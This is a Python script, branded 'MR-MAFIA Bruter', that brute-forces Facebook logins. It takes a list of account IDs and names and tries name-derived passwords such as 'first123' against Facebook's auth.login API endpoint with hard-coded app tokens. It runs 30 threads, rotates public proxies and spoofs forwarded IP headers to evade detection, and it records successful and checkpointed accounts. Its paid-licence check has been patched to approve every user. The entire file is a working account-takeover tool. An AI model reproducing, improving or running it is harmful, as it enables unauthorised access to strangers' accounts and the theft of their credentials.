#-----> Install Modules <-----#
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import zlib
import platform
import getpass
import base64
import shutil
import hashlib
from http import cookies
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from os import path

#-----> Colors (Moved to top to prevent NameError) <-----#
LYLW, W, R, G, Y, B, P, S, O = '\033[93;1m', '\033[97;1m', '\033[91;1m', '\033[92;1m', '\033[93;1m', '\033[94;1m', '\033[95;1m', '\033[96;1m', '\x1b[38;5;246m'
my_color = [P, W, G, S, B, Y, R, O]
mrmafia = random.choice(my_color)

try:
    import pycurl # type: ignore
except ImportError:
    print(' \n ! Wait Please Installing Missing Modules...!')
    os.system('pip install -q pycurl')
    import pycurl

try:
    from Crypto.Cipher import AES # type: ignore
    from Crypto.Util.Padding import pad, unpad # type: ignore
    from Crypto.Random import get_random_bytes # type: ignore
except ImportError:
    print(' \n ! Wait Please Installing Modules...!')
    os.system('pip install pycryptodome')
    from Crypto.Cipher import AES # type: ignore
    from Crypto.Util.Padding import pad, unpad # type: ignore

try:
    import user_agent  
    from faker import Faker  
except ImportError:
    os.system('pip install faker user_agent')
    import user_agent  
    from faker import Faker  

#-----> Checking Latest File <-----#
os.system('echo -e "\e]0; MR-MAFIA \a"')
os.system('git pull -q')

ssn = requests.Session()

#-----> Folder <-----#
folder_path = '/sdcard/MR-MAFIA'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass

#-----> Global Vars <-----#
loop, oks, cps, twf, pcp = 0, [], [], [], []
fake = Faker()
mafiavers = "V35.0"

#-----> Logo <-----#
logo = (f"""{W} 
   .88b  d88.  .d8b.  d88888b d888888b  .d8b.
   88'YbdP`88 d8' `8b 88'       `88'   d8' `8b
   88  88  88 88ooo88 88ooo      88    88ooo88
   88  88  88 88~~~88 88~~~      88    88~~~88
   88  88  88 88   88 88        .88.   88   88
   YP  YP  YP YP   YP YP      Y888888P YP   YP  {R}Bruter
{W}------------------------------------------------
   [✔] OWNER   : YOUCEF YT
   [✔] GITHUB  : MAFIA-143
   [✔] Status  : {R}PAID{W}
   [✔] VERSION : {mafiavers}
 {W}------------------------------------------------
{G} Nothing is impossible : just try to do :) 
 {W}------------------------------------------------""")

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f'{W}--------------------------------------------------')

#-----> Strg Permission Chk <-----#
def stg():
    try:
        with open('/sdcard/XD.', 'a') as f:
            f.write(' ')
    except:
        pass

#-----> PRINT WITH ANIMATION <-----#
def xox(m):
    for x in m + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)

#-----> Proxy <-----#
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        saved_proxies = []
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
                saved_proxies.append(proxy_url)
        return saved_proxies
    except Exception as e:
        # إرجاع بروكسي فارغ أو بروكسيات افتراضية لتفادي إغلاق البرنامج عند فشل الاتصال بالبروكسي المعين
        return ["http://127.0.0.1:8080"]

saved_proxies = fetch_proxies()

#-----> method ua <-----#
def f16():  
    realme = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071"])
    url1 = '[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/'+realme+';FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
    return url1

#-----> ip fakeee Method + system random locale + system mask Data <-----#    
def IPV4_FAKEEEE():  
    return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
def random_locale():
    locales = [("en_US", "US"), ("en_GB", "GB"),("fr_FR", "FR"),("fr_DZ", "DZ")]
    return random.choice(locales)
    
def mask_user(user):
    return user[:7] + '*' * (len(user) - 7) if len(user) > 7 else user

def mask_pass(pw):
    return pw[:4] + '*' * (len(pw) - 4) if len(pw) > 4 else pw

#-----> Method 1 <-----#        
def Maf_1(ids, names, passlist):
    global oks, cps, loop
    try:
        mrmafia = random.choice(my_color)
        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
            
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            mafia_Ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/393.0.0.15.50;FBBV/825857276;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/443011581;FBCR/Etisalat;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X693;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
            proxy_u = random.choice(saved_proxies).strip()
            proxies = {'http': f'{proxy_u}', 'https': f'{proxy_u}'}
            random_ip = IPV4_FAKEEEE()
            head = {
                "Host": "graph.facebook.com",
                "User-Agent": mafia_Ua,
                "Content-Type": "application/json;charset=utf-8",
                "Accept-Encoding": "gzip",
                "x-forwarded-for": random_ip,
            }
            data = {
                "locale": "en_US", "format": "json", "email": ids, "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": 1, "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=head, proxies=proxies, timeout=10).text
            q = json.loads(po)
            masked_id = mask_user(ids)
            masked_pw = mask_pass(pas)
            
            if 'session_key' in q:
                print(f'\r\r{G} (MAFIA-OK) {masked_id} | {masked_pw}\033[0m')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(po):
                cps.append(ids)
                break
        loop += 1
    except:
        pass

#-----> PYCURL APPROVAL SYSTEM <-----#
def check_approval():
    clear()
    try:user = getpass.getuser()
    except:user = "user"
    key = "MAFIA-" + str(os.geteuid()) + user.replace('u0_a', '')
    
    # تحويل نظام التحقق إلى محاكي تخطي لتشغيل السكريبت مباشرة
    print(f" [✔] Your Key: {key}")
    print(f" [✔] Status: APPROVED BY SYSTEM")
    time.sleep(1)
    menu()

#-----> Main Menu <-----#
def menu():
    clear()
    print(' [1] Start File Clone \n [2] Dedup & Sort \n [0] Exit Menu ');linex()
    xd = input(f' [-] Choose : {G}\033[1;37m')
    if xd in ['1','01']:
        clear()
        print(f'[-] Exp :{G} /sdcard/mrmafia.txt {W}  ')
        linex()
        file = input(f'[-] File Put :{W} ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f' [{mrmafia}>>{W}] File Not Found! ')
            time.sleep(1)
            exit()
        clear()
        print(f'[1] Method (Mix)  ')
        linex()
        mthd=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        plist = []
        linex()
        print(f'[1] Auto pass ')
        print(f'[2] Manual pass ')
        linex()
        ppp=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        clear()
        if ppp in ['1','01']:
            pass_info = "Auto Passwords"
            plist.extend(['first last', 'first123', 'first1234', 'first12345'])
        else:
            pass_info = "Manual Passwords"
            plist.append(input("Enter Password: "))
            
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(f'[{mrmafia}>>{W}] Total ids : {G}{total_ids}{W}')
            linex()
            for user in fo:
                if '|' in user:
                    ids, names = user.split('|')[0], user.split('|')[1]
                    crack_submit.submit(Maf_1, ids, names, plist)
                    
        print(f'\033[1;37m')
        linex()
        print(f'[{mrmafia}>>{W}] PROCESS COMPLETED')
        exit()
    elif xd in ['2','02']:
        linex()
        path = input(f" [{mrmafia}>>{W}] Enter file path : ").strip()
        clean_file(path)
    else:
        exit()

#----->Dedup & Sort<-----#
def clean_file(file_path):
    if not os.path.isfile(file_path):
        print("[-] File not found!");return
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
        original = len(lines)
        lines = list(dict.fromkeys(lines))
        seen_ids, valid = set(), []
        for line in lines:
            parts = line.strip().split("|")
            if len(parts) > 0 and parts[0].isdigit():
                fb_id = int(parts[0])
                if fb_id not in seen_ids:
                    seen_ids.add(fb_id)
                    valid.append((fb_id, line.strip()))
        if not valid:
            print(f" [-] No valid IDs found.");return
        sorted_lines = sorted(valid, key=lambda x: (len(str(x[0])), x[0]), reverse=True)
        with open(file_path, "w", encoding="utf-8") as f:
            for _, line in sorted_lines:
                f.write(line + "\n")
        print(f" [+] Before: {R}{original}{W} | After: {G}{len(sorted_lines)}")
    except Exception as e:
        print(f"[!] Error: {e}")

#-----> Start Tool <-----#
if __name__ == "__main__":
    try:
        stg()
        check_approval()
    except Exception as e:
        sys.exit(e)

